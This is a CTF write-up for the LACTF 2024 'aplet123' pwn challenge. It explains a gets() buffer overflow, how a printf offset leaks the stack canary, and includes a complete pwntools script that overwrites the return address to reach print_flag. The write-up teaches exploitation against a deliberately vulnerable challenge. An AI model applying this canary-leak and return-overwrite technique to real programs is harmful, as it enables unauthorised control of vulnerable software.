# aplet123

aplet123 was an introductory pwn challenge, for LACTF 2024. We are given the C source code for the program, shown below:

```clike=
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

void print_flag(void) {
  char flag[256];
  FILE *flag_file = fopen("flag.txt", "r");
  fgets(flag, sizeof flag, flag_file);
  puts(flag);
}

const char *const responses[] = {"L",
                                 "amongus",
                                 "true",
                                 "pickle",
                                 "GINKOID",
                                 "L bozo",
                                 "wtf",
                                 "not with that attitude",
                                 "increble",
                                 "based",
                                 "so true",
                                 "monka",
                                 "wat",
                                 "monkaS",
                                 "banned",
                                 "holy based",
                                 "daz crazy",
                                 "smh",
                                 "bruh",
                                 "lol",
                                 "mfw",
                                 "skissue",
                                 "so relatable",
                                 "copium",
                                 "untrue!",
                                 "rolled",
                                 "cringe",
                                 "unlucky",
                                 "lmao",
                                 "eLLe",
                                 "loser!",
                                 "cope",
                                 "I use arch btw"};

int main(void) {
  setbuf(stdout, NULL);
  srand(time(NULL));
  char input[64];
  puts("hello");
  while (1) {
    gets(input);
    char *s = strstr(input, "i'm");
    if (s) { // 0x00000000004012ee
      printf("hi %s, i'm aplet123\n", s + 4); 
    } else if (strcmp(input, "please give me the flag") == 0) {
      puts("i'll consider it");
      sleep(5);
      puts("no");
    } else if (strcmp(input, "bye") == 0) { // 0x0000000000401357
      puts("bye");
      break;
    } else {
      puts(responses[rand() % (sizeof responses / sizeof responses[0])]);
    }
  }
}
```

Upon examination of this program, we notice that there is a `print_flag` function at the top which will simply give us the flag on remote, so we want to somehow invoke this function. However, nowhere in the code is this function explicitly invoked, so we cannot simply navigate around the intended behavior of the program to get the flag. Instead, we will have to look for another path to execute this function. 

In C, the `gets` function is often vulnerable to attacks such as buffer overflows, which we quickly notice in the source code. We can exploit this.

## The Buffer Overflow 

A buffer overflow is a common vulnerability in C programs that use the unprotected `gets` function. `gets` reads in an input from stdin and writes to a buffer, which is notorious for being unsafe as unlike its successors like `fgets` or `scanf`, will not limit how much text is read from stdin. This means that if we simply provide more than 64 characters, `gets` will read more than 64 characters to the input buffer of size 64 and simply continue to overwrite the values on the stack allocated beyond it. One main consequence of this is that if we continue to overwrite enough contents on the stack, we can eventually reach the location of the return address of a function (which is the first item stored on the stack frame of a function in C), and overwrite it arbitrarily with a return address of our choosing. Particularly, we will overwrite it with the address of `print_flag` such that when `main` ends, the program will simply print the flag. 

### Stack Canaries

However, an elementary buffer overflow will not be sufficient for this challenge. When we run `checksec` on the executable we are provided in the challenge description, we get the following:
```shell
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
The main vulnerability that will prevent our buffer overflow is the stack canary, which is enabled. The stack canary, in a 64-bit system, is a random sequence of 8 bytes placed in between the return address of a function and any local variables placed after it on the stack. If an adversary attempts a buffer overflow on this, they must overwrite the stack canary, and if the stack canary is changed, the program will detect this and prematurely terminate. To bypass this, an attacker would have to overwrite the buffer until the canary, leak the canary, overwrite the canary with the canary itself, and then proceed to overwrite the return address. We will now explore how this challenge allows us to leak the canary.


### Leaking the Canary

One protection the canary has is that it starts with a null byte in our program, which prevents us from simply printing through the stack canary to leak it, as `printf` will terminate at this null byte. 

The main vulnerability in this function that allows us to leak the stack canary is the call to `printf`, which starts printing 4 bytes after a pointer which we can essentially arbitrarily set by manipulating the location of the string `i'm` in our input. Particulary, since it starts printing 4 bytes after the start of the string, we skip over the 3 characters of `i'm` *and* another byte beyond this. This leads us to ask, if we now have essentially shown that we can skip over an arbitrary byte of the stack and print after it, can we skip over this null byte and print the canary?

And we can! By using gdb to determine the distance from our buffer to the canary to be 72 bytes, we can inject 69 random characters to the buffer + 3 for `i'm`, which will bring the `*s` pointer to point 3 before the start of the canary. Now, when `printf` starts printing 4 after this location, it will print the 7 bytes of the canary after the null byte! Recovering this and placing our own null byte before this, we can recover the canary. 

After this, we'll take the path through our program we get by saying "bye" to aplet123 by inputting `bye\0` (to pass the if statement to take this branch), followed by 68 random characters to overwrite the buffer, the leaked canary itself to overwrite the canary, 8 more random characters to overwrite `rbp` and the address to our `win` function.


### Solution!
A more detailed python script to achieve this is below:

```python
#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

exe = ELF("./aplet123")
HOST, PORT = 'chall.lac.tf', 31123
def connect():
    return remote(HOST, PORT)

r = connect()
# gdb.attach(r, gdbscript='''b main
#             b *0x0000000000401357''')
            #    b *0x0000000000401374''')

win = exe.symbols["print_flag"]
log.info(f'Win: {hex(win)}')

# Step 1: get the stack canary
r.recvuntil(b'hello\n')
payload = b'A'*(64+8-4+1) + b'i\'m'
r.sendline(payload)
r.recvuntil(b'hi ')
canary = r.recvuntil(b', i\'m aplet123\n')[:-15][:7][::-1] + b'\0'
canary = canary[::-1]
log.info(f'Canary: {canary.hex()}')

# Step 2: break out of infinite loop and overwrite return
canary = int.from_bytes(canary, byteorder='little')
canary = p64(canary)
win = p64(win)
payload = b'bye\0' + b'A'*68 + canary + b'A'*8 + win
r.sendline(payload)
log.info(f'Payload sent: {payload}')

r.interactive()
```
Running this script on the remote, we get the flag!